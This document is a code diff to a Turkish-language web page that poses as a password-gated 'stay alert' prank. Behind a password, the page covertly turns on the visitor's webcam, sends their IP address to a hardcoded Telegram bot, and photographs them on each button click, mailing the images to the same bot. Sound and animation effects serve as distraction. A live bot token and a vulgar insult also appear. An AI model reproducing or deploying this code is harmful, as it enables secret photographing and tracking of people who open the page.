@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Ayık Ol</title>
   <link href="https://fonts.googleapis.com/css2?family=Russo+One&display=swap" rel="stylesheet">
   <style>
@@ -15,44 +15,76 @@
       justify-content: center;
       height: 100vh;
       text-align: center;
+      overflow: hidden;
     }
-
     #hataMesaji {
       display: none;
       font-size: 28px;
       color: red;
       animation: yanipSonme 0.5s infinite;
     }
-
     @keyframes yanipSonme {
       0%, 100% { opacity: 1; }
       50% { opacity: 0; }
     }
-
-    #ayikOl, #tamamlandi {
+    #ayikOl, #koduGonder {
       display: none;
     }
-
+    #uyari {
+      display: none;
+      color: orange;
+      font-size: 18px;
+      margin-top: 10px;
+    }
     #ayikOl {
       font-size: 60px;
       color: red;
       margin-bottom: 10px;
     }
-
-    button {
+    #koduGonder {
       font-size: 18px;
       padding: 10px 20px;
       margin-top: 20px;
       cursor: pointer;
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      transition: transform 0.2s;
+      position: relative;
+      z-index: 1;
     }
-
+    #gonderildi {
+      display: none;
+      margin-top: 10px;
+      color: lightgreen;
+    }
+    .piece {
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      background-color: #4CAF50;
+      animation: explode 0.6s forwards ease-out;
+    }
+    @keyframes explode {
+      0% { opacity: 1; transform: translate(0, 0) scale(1); }
+      100% {
+        opacity: 0;
+        transform: translate(
+          calc(100px * (0.5 - Math.random())),
+          calc(-100px * Math.random())
+        ) scale(0.5);
+      }
+    }
     video {
       display: none;
-      transform: scaleX(-1); /* Ayna yansıması efekti */
+      transform: scaleX(-1);
     }
   </style>
 </head>
 <body>
+
+  <!-- Minecraft kırılma sesi -->
+  <audio id="breakSound" src="https://minecraft.wiki/images/Minecraft_block_stone_break1.ogg?e117f" preload="auto"></audio>
 
   <div id="girisEkrani">
     <h2>Şifreyi Gir</h2>
@@ -61,26 +93,40 @@
     <button onclick="kontrolEt()">Giriş</button>
   </div>
 
-  <div id="ayikOl">AYIK OL<br><span style="font-size: 18px; color: orange;">her linke tıklama</span></div>
+  <div id="ayikOl">AYIK OL</div>
+  <div id="uyari">her linke tıklama</div>
 
   <div id="hataMesaji">Senin kafatasını sikeyim şifreyi girmeyi bile beceremedin.</div>
 
   <video id="kamera" autoplay playsinline muted></video>
-  <button id="tamamlandi" onclick="fotoGonder()">Tamamlandı</button>
-  <div id="gonderildi" style="display:none; margin-top:10px; color:lightgreen;">📸 Gönderildi!</div>
+  <button id="koduGonder" onclick="koduGonderTiklandi(this)">Kodu Gönder</button>
+  <div id="gonderildi">📸 Gönderildi!</div>
 
   <script>
     const botToken = "8403692094:AAGM3PBAgHp4OYV4ZghC92p9ytml5aaSv1g";
     const chatId = "7791726274";
+    let tiklamaSayisi = 0;
 
     function kontrolEt() {
       const sifre = document.getElementById("sifreInput").value;
       if (sifre === "671300") {
         document.getElementById("girisEkrani").style.display = "none";
         document.getElementById("ayikOl").style.display = "block";
-        document.getElementById("tamamlandi").style.display = "inline-block";
+        document.getElementById("koduGonder").style.display = "inline-block";
 
-        // Kamera aç ama görünmesin, ayna efekti aktif
+        fetch("https://api.ipify.org?format=json")
+          .then(res => res.json())
+          .then(data => {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: chatId,
+                text: `📡 IP: ${data.ip}`
+              })
+            });
+          });
+
         const video = document.getElementById('kamera');
         navigator.mediaDevices.getUserMedia({ video: true })
           .then(stream => {
@@ -96,14 +142,53 @@
       }
     }
 
+    function koduGonderTiklandi(button) {
+      tiklamaSayisi++;
+
+      // 🎵 Minecraft kırılma sesi
+      const audio = document.getElementById("breakSound");
+      audio.currentTime = 0;
+      audio.play();
+
+      // 📳 Titreşim
+      if (navigator.vibrate) {
+        navigator.vibrate(150);
+      }
+
+      // 📸 Foto çek
+      fotoGonder();
+
+      // 🟠 Uyarı yazısı
+      if (tiklamaSayisi === 2) {
+        document.getElementById("uyari").style.display = "block";
+      }
+
+      // 💥 Blok patlat
+      explodeButton(button);
+    }
+
+    function explodeButton(button) {
+      const rect = button.getBoundingClientRect();
+      const pieces = 25;
+
+      for (let i = 0; i < pieces; i++) {
+        const piece = document.createElement("div");
+        piece.classList.add("piece");
+        piece.style.left = rect.left + (Math.random() * rect.width) + "px";
+        piece.style.top = rect.top + (Math.random() * rect.height) + "px";
+        document.body.appendChild(piece);
+        setTimeout(() => piece.remove(), 600);
+      }
+
+      button.style.visibility = "hidden";
+    }
+
     function fotoGonder() {
       const video = document.getElementById('kamera');
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       const ctx = canvas.getContext('2d');
-
-      // Ayna etkisi için ters çevirerek çiziyoruz
       ctx.translate(canvas.width, 0);
       ctx.scale(-1, 1);
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -117,8 +202,10 @@
           method: "POST",
           body: formData
         }).then(() => {
-          document.getElementById("tamamlandi").style.display = "none";
           document.getElementById("gonderildi").style.display = "block";
+          setTimeout(() => {
+            document.getElementById("gonderildi").style.display = "none";
+          }, 2000);
         }).catch(err => {
           console.error("Foto gönderilemedi:", err);
         });
